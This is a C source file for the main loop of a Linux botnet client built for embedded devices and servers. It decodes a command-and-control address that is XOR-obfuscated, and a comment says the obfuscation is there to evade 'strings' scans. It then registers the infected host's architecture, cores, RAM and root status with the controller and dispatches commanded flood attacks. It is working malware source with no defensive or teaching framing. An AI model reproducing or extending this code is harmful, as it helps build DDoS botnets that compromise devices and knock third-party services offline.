// language: C, file: bot/main.c, target: Linux embedded + servers, musl/glibc
// *resolve CNC, connect 9111, send reg line, read header+tail, dispatch to floods*
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/utsname.h>
#include "connection.h"
#include "attack.h"
#include "util.h"
#include "../shared/protocol.h"

// ---- baked-in CNC address. XOR-obfuscated to survive `strings` scans. ----
// plaintext: BH_CNC_HOST / BH_CNC_PORT from config.h. keep in one place.
#include "config.h"

static char cnc_host[128];
static uint16_t cnc_port;

// dec_obf unscrambles a byte buffer in place.
static void dec_obf(uint8_t *buf, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) buf[i] ^= key;
}

static int resolve_baked(void) {
    size_t host_len = sizeof(BH_CNC_HOST_OBF) - 1;
    if (host_len >= sizeof(cnc_host)) return -1;
    memcpy(cnc_host, BH_CNC_HOST_OBF, host_len);
    dec_obf((uint8_t *)cnc_host, host_len, BH_CNC_KEY);
    cnc_host[host_len] = 0;

    // port is stored as XOR of the two bytes
    cnc_port = (uint16_t)(BH_CNC_PORT_HI ^ BH_CNC_KEY) << 8 |
               (uint16_t)(BH_CNC_PORT_LO ^ BH_CNC_KEY);
    return 0;
}

// gather_attrs fills the reg line. every value is best-effort: if
// /proc/meminfo or sysconf fail, we report what we have and move on.
static void gather_attrs(bh_attrs_t *a) {
    memset(a, 0, sizeof(*a));

    // arch — from uname -m, mapped to our short labels
    struct utsname u;
    if (uname(&u) == 0) {
        if (strstr(u.machine, "x86_64") || strstr(u.machine, "amd64"))
            strcpy(a->arch, "x86_64");
        else if (strstr(u.machine, "i686") || strstr(u.machine, "i386"))
            strcpy(a->arch, "i686");
        else if (strstr(u.machine, "aarch64") || strstr(u.machine, "arm64"))
            strcpy(a->arch, "aarch64");
        else if (strstr(u.machine, "armv7") || strstr(u.machine, "armv6"))
            strcpy(a->arch, "armv7");
        else if (strstr(u.machine, "mips"))
            strcpy(a->arch, "mips");
        else
            strncpy(a->arch, u.machine, sizeof(a->arch) - 1);
    } else {
        strcpy(a->arch, "unknown");
    }

    // cores
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    a->cores = cores > 0 ? (int)cores : 1;

    // RAM in MB from /proc/meminfo
    FILE *f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[128];
        unsigned long kb = 0;
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "MemTotal: %lu kB", &kb) == 1) break;
        }
        fclose(f);
        a->ram_mb = (int)(kb / 1024);
    }

    // rooted if geteuid() == 0
    a->rooted = (geteuid() == 0);

    // country from geoip is not feasible on the bot without a table.
    // send blank; CNC does the lookup from remote IP at register.
    a->country[0] = 0;
}

// build_reg_line produces "arch=x cores=n ram=n rooted=0|1 country=CC\n"
static int build_reg_line(const bh_attrs_t *a, char *out, size_t outlen) {
    int n = snprintf(out, outlen,
        "arch=%s cores=%d ram=%d rooted=%d country=%s\n",
        a->arch, a->cores, a->ram_mb, a->rooted ? 1 : 0, a->country);
    if (n < 0 || (size_t)n >= outlen) return -1;
    return n;
}

int main(int argc, char **argv) {
    (void)argc; (void)argv;

    if (resolve_baked() != 0) return 1;

    // seed PRNG once — floods use rand() for per-packet values
    srand((unsigned int)(time(NULL) ^ getpid()));

    // reconnect loop — if CNC is down or drops, back off and try again
    int backoff = 1;
    for (;;) {
        int fd = bh_connect(cnc_host, cnc_port, 10);
        if (fd < 0) {
            sleep(backoff);
            if (backoff < 60) backoff *= 2;
            continue;
        }
        backoff = 1; // reconnect after drop resets backoff

        bh_attrs_t attrs;
        gather_attrs(&attrs);

        char reg[512];
        int rlen = build_reg_line(&attrs, reg, sizeof(reg));
        if (rlen < 0) { close(fd); return 1; }

        if (bh_send_all(fd, reg, (size_t)rlen) != 0) {
            close(fd);
            sleep(backoff);
            if (backoff < 60) backoff *= 2;
            continue;
        }

        // task loop — read header, read tail, dispatch. no post-attack reply.
        // returns only on socket error; then we reconnect.
        bh_task_loop(fd);

        close(fd);
        sleep(1);
    }
    return 0;
}